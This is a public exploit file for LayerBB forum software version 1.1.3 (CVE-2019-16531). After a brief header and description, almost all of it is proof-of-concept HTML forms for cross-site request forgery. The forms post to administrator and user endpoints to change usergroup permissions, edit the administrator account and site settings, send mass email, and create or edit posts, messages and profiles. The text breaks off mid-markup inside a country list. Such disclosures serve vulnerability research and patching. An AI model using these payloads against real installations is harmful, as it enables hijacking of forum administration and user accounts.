@@ -1,0 +1,532 @@
+# Exploit Title: LayerBB 1.1.3 - Multiple CSRF
+# Date: 4/7/2019
+# Author: 0xB9
+# Twitter: @0xB9Sec
+# Contact: 0xB9[at]pm.me
+# Software Link: https://forum.layerbb.com/downloads.php?view=file&id=30
+# Version: 1.1.3
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2019-16531
+
+
+1. Description:
+LayerBB is a free open-source forum software, multiple CSRF vulnerabilities were found such as editing user profiles and forums.
+
+
+2. Proof of Concepts:
+
+<!-- Edit Usergroup CSRF -->
+<form action="http://localhost/admin/edit_usergroup.php/id/1" method="POST" style="padding: 25px;">
+    <label for="g_name">Name</label>
+    <input type="text" name="g_name" id="g_name" value="User" class="form-control">
+    <label for="g_style">Style <small><code>%username%</code> will be replaced with the user's username.</small></label>
+    <textarea name="g_style" id="g_style" class="form-control"><span>%username%</span></textarea>
+    <label for="b_style_s">Banner Style Start</label>
+    <textarea name="b_style_s" id="b_style_s" class="form-control"><span class="label label -default"></textarea>
+    <label for="b_style_e">Banner Style End</label>
+    <textarea name="b_style_e" id="b_style_e" class="form-control"></span></textarea>
+    <label for="permissions">Permissions</label><br>
+    <input type="checkbox" name="permissions[]" value="1" checked=""> view_forum<br><input type="checkbox" name="permissions[]" value="2" checked=""> create_thread<br><input type="checkbox" name="permissions[]" value="3" checked=""> reply_thread<br><input type="checkbox" name="permissions[]" value="4"> access_moderation<br><input type="checkbox" name="permissions[]" value="5"> access_administration<br>
+    <br>
+    <input type="checkbox" name="is_staff" value="1"> This Usergroup is staff.
+    <br>
+    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
+</form>
+<!-- Edit Usergroup CSRF End -->
+
+<!-- Edit User CSRF -->
+<form action="http://localhost/admin/edit_user.php/id/1" method="POST" style="padding: 25px;">
+    <label for="username">Username</label>
+    <input type="text" name="username" id="username" value="Administrator" class="form-control">
+    <label for="email">Email Address</label>
+    <input type="text" name="email" id="email" value="demo@layerbb.com" class="form-control">
+    <label for="usermsg">User Message</label>
+    <input type="text" name="usermsg" id="usermsg" value="User" class="form-control">
+    <label for="signature">User Signature</label>
+    <textarea id="editor" name="signature" class="form-control" style="min-height:250px;"></textarea>
+    <label for="disabled">User Activated</label><br>
+    <input type="radio" name="disabled" value="0" checked=""> Do Not Change<br>
+    <input type="radio" name="disabled" value="0"> Active<br>
+    <input type="radio" name="disabled" value="1"> Disabled<br>
+    <br>
+    <label for="usergroup">Usergroup</label><br>
+    <select name="usergroup" id="usergroup" style="width:100%;">
+    <option value="4" selected="">Dont Change</option>
+    <option value="1">User</option><option value="2">Banned</option><option value="3">Moderator</option><option value="4">Administrator</option>
+    </select><br><br>
+    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
+</form>
+<!-- Edit User CSRF End -->
+
+<!-- Edit Category CSRF -->
+<form action="http://localhost/admin/edit_category.php/id/1" method="POST" style="padding: 25px;">
+    <label for="cat_title">Title</label>
+    <input type="text" name="cat_title" id="cat_title" value="First Category" class="form-control">
+    <label for="cat_desc">Description</label>
+    <textarea name="cat_desc" id="cat_desc" class="form-control">First category on this forum!</textarea>
+    <br>
+    <label for="allowed_usergroups">Allowed Usergroups</label><br>
+    <input type="checkbox" name="allowed_ug[]" value="0" checked=""> Guest<br><input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2"> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
+    <br>
+    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
+</form>
+<!-- Edit Category CSRF End -->
+
+<!-- Edit Node CSRF -->
+<form action="http://localhost/admin/edit_node.php/id/1" method="POST" style="padding: 25px;">
+    <label for="cat_title">Title</label>
+    <input type="text" name="node_title" id="cat_title" value="First Node" class="form-control">
+    <label for="cat_desc">Description</label>
+    <textarea name="node_desc" id="cat_desc" class="form-control">The first node on this forum</textarea>
+    <label for="parent">Parent</label><br>
+    <select name="node_parent" id="parent" style="width:100%;">
+    <option value="1" selected="">First Category</option>
+    </select>
+    <br>
+    <label for="additional_option">Additional Options</label><br>
+    <input type="checkbox" name="lock_node" value="1" id="lock_node"> <label style="font-weight: normal;" for="lock_node">Lock Node</label>
+    <br>
+    <label for="allowed_usergroups">Allowed Usergroups</label><br>
+    <input type="checkbox" name="allowed_ug[]" value="0" checked=""> Guest<br><input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2"> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
+    <label for="labels">Labels</label> <small>Each Line is a new label. HTML enabled.</small>
+    <textarea name="labels" id="labels" class="form-control"></textarea><br>
+    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
+</form>
+<!-- Edit Node CSRF End -->
+
+<!-- System Settings CSRF -->
+<form action="http://localhost/admin/general.php" enctype="multipart/form-data" method="POST"><section class="col-lg-12">
+    <div class="box box-success">
+    <div class="box-header">
+    <div class="tab-content" style="padding: 25px;">
+    <br>
+       <label for="site_name">Board Name</label>
+       <input type="text" class="form-control" name="site_name" id="site_name" value="LayerBB Demo">
+       <label for="board_email">Board Email</label>
+       <input type="text" class="form-control" name="board_email" id="board_email" value="demo@layerbb.com">
+       <label for="number_subs">Number of shown subforums</label>
+       <input type="text" class="form-control" name="number_subs" id="number_subs" value="3">
+       <input type="checkbox" name="register_enable" value="1" id="reg_enable" checked=""> <label for="reg_enable">Enable Registeration</label><br>
+       <input type="checkbox" name="post_merge" value="1" id="post_merge" checked=""> <label for="post_merge">Merge Posts (<a href="#" title="Merge consecutive posts by the same user." id="tooltip">?</a>)</label><br>
+       <input type="checkbox" name="site_enable" value="1" id="site_enable" checked=""> <label for="site_enable">Forum Enabled (<a href="#" title="Allows you to enable or disable your forums." id="tooltip">?</a>)</label><br>
+       <input type="checkbox" name="email_verify" value="1" id="email_verify"> <label for="email_verify">Email Verification (<a href="#" title="Allows you to enable or disable email verification." id="tooltip">?</a>)</label><br>
+       <input type="checkbox" name="enable_signatures" value="1" id="enable_signatures" checked=""> <label for="enable_signatures">Allow user signatures (<a href="#" title="Allows you to disable user signatures." id="tooltip">?</a>)</label><br>
+       <input type="checkbox" name="enable_pcomments" value="1" id="enable_pcomments" checked=""> <label for="enable_pcomments">Enable Profile Comments (<a href="#" title="Allows you to disable profile comments." id="tooltip">?</a>)</label><br>
+       <br>
+       <label for="default_language">Default Languge</label><br>
+       <select name="default_language" id="Default_language" class="form-control">
+       <option value="english" selected="">English</option>
+       </select><br>
+       <input type="checkbox" name="enable_rtl" value="1" id="enable_rtl"> <label for="enable_rtl">Enable RTL (<a href="#" title="Enable Right-to-left for languages that need RTL" id="tooltip">?</a>)</label><br><br>
+       <label for="board_rules">Board Rules</label>
+       <span id="helpBlock" class="help-block">HTML tags will be converted into ascii codes. Hyperlinks are not supported!</span>
+       <textarea name="board_rules" class="form-control" style="min-height:250px;">- No spamming.</textarea>
+       <br>
+       <label for="offline_msg">Offline Message</label>
+       <span id="helpBlock" class="help-block">HTML tags will be converted into ascii codes.</span>
+       <textarea name="offline_msg" class="form-control" style="min-height:250px;"></textarea>
+    <br>
+      <label for="rcap_public">reCaptcha Public Key</label>
+      <input type="text" name="rcap_public" id="rcap_public" class="form-control" value="0">
+      <label for="rcap_private">reCaptcha Private Key</label>
+      <input type="text" name="rcap_private" id="rcap_private" class="form-control" value="0">
+      <input type="checkbox" name="enable_recaptcha" value="1"> Use reCaptcha<br>
+    <br>
+      <label for="content">Board Signature</label>
+      <textarea id="editor" name="board_signature" class="form-control" style="min-height:250px;"></textarea>
+      <div class="alert alert-info" role="alert"><b>Please Note:</b> HTML Tags do not work, line breaks and urls are automatically converted!</div>
+    <br>
+      <label for="custom_logo">Easy Logo Changer</label>
+      <input type="file" name="custom_logo" id="custom_logo" class="form-control">
+
+    </div><br>
+  <center><input type="submit" name="update" class="btn btn-default" value="Save Settings"></center><br>
+  </div>
+  </div></section>
+</form>
+<!-- System Settings CSRF End -->
+
+<!-- Manage Category CSRF -->
+<table class="table table-hover">
+     <thead>
+       <tr>
+          <th style="width:70%">Category</th>
+          <th style="width:10%">Order</th>
+          <th style="width:20%">Controls</th>
+        </tr>
+     </thead>
+     <tbody>
+       <tr>
+        <td>
+          <strong>test cat</strong><br>
+          <small>test cat</small>
+        </td>
+        <td>
+          <form action="http://localhost/admin/manage_category.php" method="POST">
+            <input type="hidden" name="cat_id" value="2">
+            <input type="text" class="form-control" name="cat_place" value="1">
+            <input type="submit" name="change_place" style="display:none;">
+          </form>
+        </td>
+        <td>
+          <div class="btn-group">
+              <li><a href="http://localhost/admin/edit_category.php/id/2">Edit Category</a></li>
+              <li><a href="http://localhost/admin/manage_category.php/delete_category/2">Delete Category</a></li>
+          </div>
+        </td>
+      </tr><tr>
+        <td>
+          <strong>First Category</strong><br>
+          <small>First category on this forum!</small>
+        </td>
+        <td>
+          <form action="http://localhost/admin/manage_category.php" method="POST">
+            <input type="hidden" name="cat_id" value="1">
+            <input type="text" class="form-control" name="cat_place" value="2">
+            <input type="submit" name="change_place" style="display:none;">
+          </form>
+        </td>
+        <td>
+          <div class="btn-group">
+              <li><a href="http://localhost/admin/edit_category.php/id/1">Edit Category</a></li>
+              <li><a href="http://localhost/admin/manage_category.php/delete_category/1">Delete Category</a></li>
+          </div>
+        </td>
+      </tr>
+    </tbody>
+</table>
+<center><h3>Use <font color="red">ENTER</font> to save catagory order</h3></center>
+<!-- Manage Category CSRF End -->
+
+<!-- Manage Node CSRF -->
+<table class="table table-hover">
+    <thead>
+      <tr>
+        <th style="width:70%">Node</th>
+        <th style="width:10%">Order</th>
+        <th style="width:20%">Controls</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+      <td>
+        <strong><a href="#" target="_blank">First Node</a></strong><br>
+        <small>The first node on this forum</small><br>
+        <small>Sub-Forums: </small>
+      </td>
+      <td>
+        <form action="http://localhost/admin/manage_node.php" method="POST">
+          <input type="hidden" name="node_id" value="1">
+          <input type="text" class="form-control" name="node_place" value="0">
+          <input type="submit" name="change_place" style="display:none;">
+        </form>
+      </td>
+      <td>
+        <div class="btn-group">
+            <li><a href="http://localhost/admin/edit_node.php/id/1">Edit Node</a></li>
+            <li><a href="http://localhost/admin/manage_node.php/delete_node/1">Delete Node</a></li>
+            <li><a href="http://localhost/admin/manage_node.php/toggle_lock/1">Toggle Lock</a></li>
+        </div>
+      </td>
+    </tr>
+    </tbody>
+</table>
+<center><h3>Use <font color="red">ENTER</font> to save catagory order</h3></center>
+<!-- Manage Node CSRF End -->
+
+<!-- Mass Mail CSRF -->
+<form action="http://localhost/admin/massemail.php" method="POST" style="padding: 25px;">
+    <label for="subject">Subject</label>
+    <input type="text" name="subject" id="subject" value="" class="form-control">
+    <label for="content">Email Content</label>
+    <textarea id="editor" name="content" class="form-control" style="min-height:250px;"></textarea><br>
+    <div class="alert alert-info" role="alert"><b>Please Note:</b> HTML Tags do not work, line breaks and urls are automatically converted!</div>
+    <input type="submit" name="send" value="Send Email" class="btn btn-default">
+</form>
+<!-- Mass Mail CSRF End -->
+
+<!-- Navbar CSRF -->
+<form method="POST" action="http://localhost/admin/navbar.php">
+  <h4 class="modal-title" id="myModalLabel">Editing <b>google</b> Navbar Item</h4>
+    <input type="hidden" name="id" value="1">
+    <div class="form-group">
+      <label for="title">URL Title</label>
+      <input type="text" class="form-control" id="title" name="title" value="google">
+    </div>
+    <div class="form-group">
+      <label for="url">URL</label>
+      <input type="text" class="form-control" id="url" name="url" value="https://google.com">
+    </div>
+    <div class="form-group">
+      <label for="newpage">Open URL in new page</label>
+      <select class="form-control" id="newpage" name="newpage">
+        <option value="1">Current - Do Not Change</option>
+        <option value="1">Yes</option>
+        <option value="0">No</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label for="order">Order</label>
+      <input type="text" class="form-control" id="order" name="order" value="1">
+    </div>
+    <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
+</form>
+<!-- Navbar CSRF End -->
+
+<!-- New Category CSRF -->
+<form action="http://localhost/admin/new_category.php" method="POST" style="padding: 25px;">
+   <label for="cat_title">Title</label>
+   <input type="text" name="cat_title" id="cat_title" class="form-control">
+   <label for="cat_desc">Description</label>
+   <textarea name="cat_desc" id="cat_desc" class="form-control"></textarea>
+   <br>
+   <label for="allowed_usergroups">Allowed Usergroups</label>
+   <br>
+   <input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2" checked=""> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
+   <br>
+   <input type="submit" name="create" value="Create Category" class="btn btn-default">
+</form>
+<!-- New Category CSRF End -->
+
+<!-- New Node CSRF -->
+<form action="http://localhost/admin/new_node.php" method="POST" style="padding: 25px;">
+   <label for="node_title">Title</label>
+   <input type="text" name="node_title" id="node_title" class="form-control">
+   <label for="node_desc">Description</label>
+   <textarea name="node_desc" id="node_desc" class="form-control"></textarea>
+   <label for="parent">Parent</label><br>
+   <select name="node_parent" id="parent">
+     <option value="1">First Category</option><option value="&1">&nbsp;&nbsp;&nbsp;&nbsp;-First Node</option>
+   </select>
+   <br>
+   <label for="additional_option">Additional Options</label><br>
+   <input type="checkbox" name="lock_node" value="1" id="lock_node"> <label style="font-weight: normal;" for="lock_node">Lock Node</label>
+   <br>
+   <label for="allowed_usergroups">Allowed Usergroups</label>
+   <br>
+   <input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2" checked=""> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
+   <label for="labels">Labels</label> <small>Each Line is a new label. HTML enabled.</small>
+   <textarea name="labels" id="labels" class="form-control"></textarea><br>
+   <input type="submit" name="create" value="Create Node" class="btn btn-default">
+</form>
+<!-- New Node CSRF End -->
+
+<!-- New Usergroup CSRF End -->
+<form action="http://localhost/admin/new_usergroup.php" method="POST" style="padding: 25px;">
+    <label for="g_name">Name</label>
+    <input type="text" name="g_name" id="g_name" class="form-control">
+    <label for="g_style">Style <small><code>%username%</code> will be replaced with the user's username.</small></label>
+    <textarea name="g_style" id="g_style" class="form-control"><span>%username%</span></textarea>
+    <label for="permissions">Permissions</label><br>
+    <input type="checkbox" name="permissions[]" value="1"> view_forum<br><input type="checkbox" name="permissions[]" value="2"> create_thread<br><input type="checkbox" name="permissions[]" value="3"> reply_thread<br><input type="checkbox" name="permissions[]" value="4"> access_moderation<br><input type="checkbox" name="permissions[]" value="5"> access_administration<br>
+    <br>
+    <input type="checkbox" name="is_staff" value="1"> This Usergroup is staff.
+    <br>
+    <input type="submit" name="new" value="Create Usergroup" class="btn btn-default">
+</form>
+<!-- New Usergroup CSRF End -->
+
+<!-- Profile Fields CSRF -->
+<form method="POST" action="http://localhost/admin/profile_fields.php" style="padding: 25px;">
+    <input type="hidden" name="id" value="1">
+    <div class="form-group">
+    <label for="title">Title</label>
+    <input type="text" class="form-control" id="title" name="title" value="discord">
+    </div>
+    <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
+</form>
+<!-- Profile Fields CSRF End -->
+
+<!-- Sidebar CSRF -->
+<form method="POST" action="http://localhost/admin/sidebar.php" style="padding: 25px;">
+    <input type="hidden" name="id" value="1">
+    <div class="form-group">
+      <label for="title">Title</label>
+      <input type="text" class="form-control" id="title" name="title" value="Demo Information">
+    </div>
+    <div class="form-group">
+      <label for="content">Content</label>
+      <textarea class="form-control" name="content" id="content" style="min-height:250px;"><div class="alert alert-danger" role="alert"> This is the LayerBB Demo Website, you can login using<br /><br /> User: Administrator <br />Pass: admin (Case sensitive)<br /><br />This demo gets refreshed every 24-hours.</div></textarea>
+    </div>
+    <div class="form-group">
+      <label for="style">Style</label>
+      <select class="form-control" id="style" name="style">
+      <option value="danger">Current - Do Not Change</option>
+      <option value="primary">Primary</option>
+      <option value="success">Success</option>
+      <option value="info">Info</option>
+      <option value="warning">Warning</option>
+      <option value="danger">Danger</option></select>
+    </div>
+    <div class="form-group">
+      <label for="glyphicon">Glyphicon (Optional)</label>
+      <input type="text" class="form-control" id="glyphicon" name="glyphicon" value="alert">
+    </div>
+    <div class="form-group">
+      <label for="order">Order</label>
+      <input type="text" class="form-control" id="order" name="order" value="1">
+    </div>
+  <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
+</form>
+<!-- Sidebar CSRF End -->
+
+<!-- Edit Threads/Posts CSRF -->
+<form id="LAYER_form" action="http://localhost/edit.php/post/1" method="POST" style="padding: 25px;">
+    <input id="title" name="title" type="text" value="test"><br>
+    <textarea id="editor" name="content" style="width: 100%; height: 300px; max-width: 100%; min-width: 100%;">test post</textarea>
+    <br>
+    <input type="submit" name="edit" value="Edit Post">
+</form>
+<!-- Edit Threads/Posts CSRF -->
+
+<!-- New Threads/Posts CSRF -->
+<form id="LAYER_form" action="http://localhost/new.php/node/1" method="POST" style="padding: 25px;">
+  <input type="text" name="title" placeholder="Thread Title..." style="width:100%;" class="col-sm-9 form-control">
+  <div class="clearfix"></div>
+  <br>
+  <textarea id="editor" style="width: 100%; height: 300px; max-width: 100%;" name="content"></textarea>
+
+  <div class="center-block" style="margin-top:5px;">
+      <input type="submit" name="create" value="Create Thread">
+  </div>
+
+  <br>
+  <ul class="nav nav-tabs">
+      <li class="active"><a href="#polls" data-toggle="tab">Polls</a></li>
+  </ul>
+  <div class="tab-content">
+      <div class="tab-pane active" id="polls">
+           <div class="col-md-6">
+               <label for="question">Question</label>
+               <input type="text" name="question">
+               <label for="answer_1">1. Answer</label>
+               <input type="text" name="answer_1" id="answer_1">
+               <label for="answer_2">2. Answer</label>
+               <input type="text" name="answer_2" id="answer_2">
+               <span class="btn btn-primary btn-xs" href="" onclick="plus();"> Add an answer field </span>
+           </div>
+      </div>
+  </div>
+</form>
+<!-- New Threads/Posts CSRF End -->
+
+<!-- Thread Reply CSRF -->
+<form id="LAYER_form" action="http://localhost/reply.php/test.1" method="POST" style="padding: 25px;">
+    <textarea id="editor" style="width: 100%; height: 300px;" name="content"></textarea>
+    <p class="pull-right" style="margin-top:5px;">
+        <input type="submit" name="reply" value="Post Reply">
+    </p>
+</form>
+<!-- Thread Reply CSRF End -->
+
+<!-- PM Reply CSRF -->
+<form id="%form_id%" action="http://localhost/conversations.php/cmd/reply/id/1" method="POST" style="padding: 25px;">
+    <textarea id="editor" style="width: 100%; height: 300px;" name="content"></textarea>
+    <p class="pull-right" style="margin-top:5px;">
+        <input type="submit" name="reply" value="Post Reply">
+    </p>
+</form>
+<!-- PM Reply CSRF End -->
+
+<!-- Report Post CSRF -->
+<form action="http://localhost/report.php/post/1" id="LAYER_form" method="POST" style="padding: 25px;">
+    <label for="reason">Reason</label>
+    <textarea name="reason" style="height:150px;width:100%;min-width:100%;max-width:100%;"></textarea>
+    <br>
+    <input type="submit" name="report" value="Report">
+</form>
+<!-- Report Post CSRF End -->
+
+<!-- Edit Profile CSRF -->
+<form id="LAYER_form" action="http://localhost/profile.php/cmd/edit" method="POST" style="padding: 25px;">
+    <label for="email">Email</label>
+    <input type="text" name="email" id="email" value="demo@layerbb.com">
+    <label for="usermsg">User Message</label>
+    <input type="text" name="usermsg" id="usermsg" value="User">
+    <label for="gender">Gender</label>
+    <select id="gender" name="gender"><option value="0" selected="selected">Not telling</option>
+    <option value="1">Female</option>
+    <option value="2">Male</option></select>
+    <label for="timezone">Timezone</label>
+    <select id="timezone" name="timezone"><option value="Pacific/Midway">(UTC-11:00) Midway Island</option><option value="Pacific/Samoa">(UTC-11:00) Samoa</option><option value="Pacific/Honolulu">(UTC-10:00) Hawaii</option><option value="US/Alaska">(UTC-09:00) Alaska</option><option value="America/Los_Angeles">(UTC-08:00) Pacific Time (US & Canada)</option><option value="America/Tijuana">(UTC-08:00) Tijuana</option><option value="US/Arizona">(UTC-07:00) Arizona</option><option value="America/Chihuahua">(UTC-07:00) Chihuahua</option><option value="America/Chihuahua">(UTC-07:00) La Paz</option><option value="America/Mazatlan">(UTC-07:00) Mazatlan</option><option value="US/Mountain">(UTC-07:00) Mountain Time (US & Canada)</option><option value="America/Managua">(UTC-06:00) Central America</option><option value="US/Central" selected="selected">(UTC-06:00) Central Time (US & Canada)</option><option value="America/Mexico_City">(UTC-06:00) Guadalajara</option><option value="America/Mexico_City">(UTC-06:00) Mexico City</option><option value="America/Monterrey">(UTC-06:00) Monterrey</option><option value="Canada/Saskatchewan">(UTC-06:00) Saskatchewan</option><option value="America/Bogota">(UTC-05:00) Bogota</option><option value="US/Eastern">(UTC-05:00) Eastern Time (US & Canada)</option><option value="US/East-Indiana">(UTC-05:00) Indiana (East)</option><option value="America/Lima">(UTC-05:00) Lima</option><option value="America/Bogota">(UTC-05:00) Quito</option><option value="Canada/Atlantic">(UTC-04:00) Atlantic Time (Canada)</option><option value="America/Caracas">(UTC-04:30) Caracas</option><option value="America/La_Paz">(UTC-04:00) La Paz</option><option value="America/Santiago">(UTC-04:00) Santiago</option><option value="Canada/Newfoundland">(UTC-03:30) Newfoundland</option><option value="America/Sao_Paulo">(UTC-03:00) Brasilia</option><option value="America/Argentina/Buenos_Aires">(UTC-03:00) Buenos Aires</option><option value="America/Argentina/Buenos_Aires">(UTC-03:00) Georgetown</option><option value="America/Godthab">(UTC-03:00) Greenland</option><option value="America/Noronha">(UTC-02:00) Mid-Atlantic</option><option value="Atlantic/Azores">(UTC-01:00) Azores</option><option value="Atlantic/Cape_Verde">(UTC-01:00) Cape Verde Is.</option><option value="Africa/Casablanca">(UTC+00:00) Casablanca</option><option value="Europe/London">(UTC+00:00) Edinburgh</option><option value="Etc/Greenwich">(UTC+00:00) Greenwich Mean Time : Dublin</option><option value="Europe/Lisbon">(UTC+00:00) Lisbon</option><option value="Europe/London">(UTC+00:00) London</option><option value="Africa/Monrovia">(UTC+00:00) Monrovia</option><option value="UTC">(UTC+00:00) UTC</option><option value="Europe/Amsterdam">(UTC+01:00) Amsterdam</option><option value="Europe/Belgrade">(UTC+01:00) Belgrade</option><option value="Europe/Berlin">(UTC+01:00) Berlin</option><option value="Europe/Berlin">(UTC+01:00) Bern</option><option value="Europe/Bratislava">(UTC+01:00) Bratislava</option><option value="Europe/Brussels">(UTC+01:00) Brussels</option><option value="Europe/Budapest">(UTC+01:00) Budapest</option><option value="Europe/Copenhagen">(UTC+01:00) Copenhagen</option><option value="Europe/Ljubljana">(UTC+01:00) Ljubljana</option><option value="Europe/Madrid">(UTC+01:00) Madrid</option><option value="Europe/Paris">(UTC+01:00) Paris</option><option value="Europe/Prague">(UTC+01:00) Prague</option><option value="Europe/Rome">(UTC+01:00) Rome</option><option value="Europe/Sarajevo">(UTC+01:00) Sarajevo</option><option value="Europe/Skopje">(UTC+01:00) Skopje</option><option value="Europe/Stockholm">(UTC+01:00) Stockholm</option><option value="Europe/Vienna">(UTC+01:00) Vienna</option><option value="Europe/Warsaw">(UTC+01:00) Warsaw</option><option value="Africa/Lagos">(UTC+01:00) West Central Africa</option><option value="Europe/Zagreb">(UTC+01:00) Zagreb</option><option value="Europe/Athens">(UTC+02:00) Athens</option><option value="Europe/Bucharest">(UTC+02:00) Bucharest</option><option value="Africa/Cairo">(UTC+02:00) Cairo</option><option value="Africa/Harare">(UTC+02:00) Harare</option><option value="Europe/Helsinki">(UTC+02:00) Helsinki</option><option value="Europe/Istanbul">(UTC+02:00) Istanbul</option><option value="Asia/Jerusalem">(UTC+02:00) Jerusalem</option><option value="Europe/Helsinki">(UTC+02:00) Kyiv</option><option value="Africa/Johannesburg">(UTC+02:00) Pretoria</option><option value="Europe/Riga">(UTC+02:00) Riga</option><option value="Europe/Sofia">(UTC+02:00) Sofia</option><option value="Europe/Tallinn">(UTC+02:00) Tallinn</option><option value="Europe/Vilnius">(UTC+02:00) Vilnius</option><option value="Asia/Baghdad">(UTC+03:00) Baghdad</option><option value="Asia/Kuwait">(UTC+03:00) Kuwait</option><option value="Europe/Minsk">(UTC+03:00) Minsk</option><option value="Africa/Nairobi">(UTC+03:00) Nairobi</option><option value="Asia/Riyadh">(UTC+03:00) Riyadh</option><option value="Europe/Volgograd">(UTC+03:00) Volgograd</option><option value="Asia/Tehran">(UTC+03:30) Tehran</option><option value="Asia/Muscat">(UTC+04:00) Abu Dhabi</option><option value="Asia/Baku">(UTC+04:00) Baku</option><option value="Europe/Moscow">(UTC+04:00) Moscow</option><option value="Asia/Muscat">(UTC+04:00) Muscat</option><option value="Europe/Moscow">(UTC+04:00) St. Petersburg</option><option value="Asia/Tbilisi">(UTC+04:00) Tbilisi</option><option value="Asia/Yerevan">(UTC+04:00) Yerevan</option><option value="Asia/Kabul">(UTC+04:30) Kabul</option><option value="Asia/Karachi">(UTC+05:00) Islamabad</option><option value="Asia/Karachi">(UTC+05:00) Karachi</option><option value="Asia/Tashkent">(UTC+05:00) Tashkent</option><option value="Asia/Calcutta">(UTC+05:30) Chennai</option><option value="Asia/Kolkata">(UTC+05:30) Kolkata</option><option value="Asia/Calcutta">(UTC+05:30) Mumbai</option><option value="Asia/Calcutta">(UTC+05:30) New Delhi</option><option value="Asia/Calcutta">(UTC+05:30) Sri Jayawardenepura</option><option value="Asia/Katmandu">(UTC+05:45) Kathmandu</option><option value="Asia/Almaty">(UTC+06:00) Almaty</option><option value="Asia/Dhaka">(UTC+06:00) Astana</option><option value="Asia/Dhaka">(UTC+06:00) Dhaka</option><option value="Asia/Yekaterinburg">(UTC+06:00) Ekaterinburg</option><option value="Asia/Rangoon">(UTC+06:30) Rangoon</option><option value="Asia/Bangkok">(UTC+07:00) Bangkok</option><option value="Asia/Bangkok">(UTC+07:00) Hanoi</option><option value="Asia/Jakarta">(UTC+07:00) Jakarta</option><option value="Asia/Novosibirsk">(UTC+07:00) Novosibirsk</option><option value="Asia/Hong_Kong">(UTC+08:00) Beijing</option><option value="Asia/Chongqing">(UTC+08:00) Chongqing</option><option value="Asia/Hong_Kong">(UTC+08:00) Hong Kong</option><option value="Asia/Krasnoyarsk">(UTC+08:00) Krasnoyarsk</option><option value="Asia/Kuala_Lumpur">(UTC+08:00) Kuala Lumpur</option><option value="Australia/Perth">(UTC+08:00) Perth</option><option value="Asia/Singapore">(UTC+08:00) Singapore</option><option value="Asia/Taipei">(UTC+08:00) Taipei</option><option value="Asia/Ulan_Bator">(UTC+08:00) Ulaan Bataar</option><option value="Asia/Urumqi">(UTC+08:00) Urumqi</option><option value="Asia/Irkutsk">(UTC+09:00) Irkutsk</option><option value="Asia/Tokyo">(UTC+09:00) Osaka</option><option value="Asia/Tokyo">(UTC+09:00) Sapporo</option><option value="Asia/Seoul">(UTC+09:00) Seoul</option><option value="Asia/Tokyo">(UTC+09:00) Tokyo</option><option value="Australia/Adelaide">(UTC+09:30) Adelaide</option><option value="Australia/Darwin">(UTC+09:30) Darwin</option><option value="Australia/Brisbane">(UTC+10:00) Brisbane</option><option value="Australia/Canberra">(UTC+10:00) Canberra</option><option value="Pacific/Guam">(UTC+10:00) Guam</option><option value="Australia/Hobart">(UTC+10:00) Hobart</option><option value="Australia/Melbourne">(UTC+10:00) Melbourne</option><option value="Pacific/Port_Moresby">(UTC+10:00) Port Moresby</option><option value="Australia/Sydney">(UTC+10:00) Sydney</option><option value="Asia/Yakutsk">(UTC+10:00) Yakutsk</option><option value="Asia/Vladivostok">(UTC+11:00) Vladivostok</option><option value="Pacific/Auckland">(UTC+12:00) Auckland</option><option value="Pacific/Fiji">(UTC+12:00) Fiji</option><option value="Pacific/Kwajalein">(UTC+12:00) International Date Line West</option><option value="Asia/Kamchatka">(UTC+12:00) Kamchatka</option><option value="Asia/Magadan">(UTC+12:00) Magadan</option><option value="Pacific/Fiji">(UTC+12:00) Marshall Is.</option><option value="Asia/Magadan">(UTC+12:00) New Caledonia</option><option value="Asia/Magadan">(UTC+12:00) Solomon Is.</option><option value="Pacific/Auckland">(UTC+12:00) Wellington</option><option value="Pacific/Tongatapu">(UTC+13:00) Nuku'alofa</option></select>
+    <br>
+    <label for="location">Location</label>
+    <select id="location" name="location"><option value="--" selected="selected">Nothing selected</option><option value="AD">Andorra</option><option value="AE">United Arab Emirates</option><option value="AF">Afghanistan</option><option value="AG">Antigua and Barbuda</option><option value="AI">Anguilla</option><option value="AL">Albania</option><option value="AM">Armenia</option><option value="AO">Angola</option><option value="AQ">Antarctica</option><option value="AR">Argentina</option><option value="AS">American Samoa</option><option value="AT">Austria</option><option value="AU">Australia</option><option value="AW">Aruba</option><option value="AX">Aland Islands</option><option value="AZ">Azerbaijan</option><option value="BA">Bosnia and Herzegovina</option><option value="BB">Barbados</option><option value="BD">Bangladesh</option><option value="BE">Belgium</option><option value="BF">Burkina Faso</option><option value="BG">Bulgaria</option><option value="BH">Bahrain</option><option value="BI">Burundi</option><option value="BJ">Benin</option><option value="BL">Saint Barthélemy</option><option value="BM">Bermuda</option><option value="BN">Brunei Darussalam</option><option value="BO">Bolivia</option><option value="BQ">Bonaire</option><option value="BR">Brazil</option><option value="BS">Bahamas</option><option value="BT">Bhutan</option><option value="BV">Bouvet Island</option><option value="BW">Botswana</option><option value="BY">Belarus</option><option value="BZ">Belize</option><option value="CA">Canada</option><option value="CC">Cocos Islands</option><option value="CD">Congo (the Democratic Republic)</option><option value="CF">Central African Republic</option><option value="CG">Congo</option><option value="CH">Switzerland</option><option value="CI">Cote d'Ivoire</option><option value="CK">Cook Islands</option><option 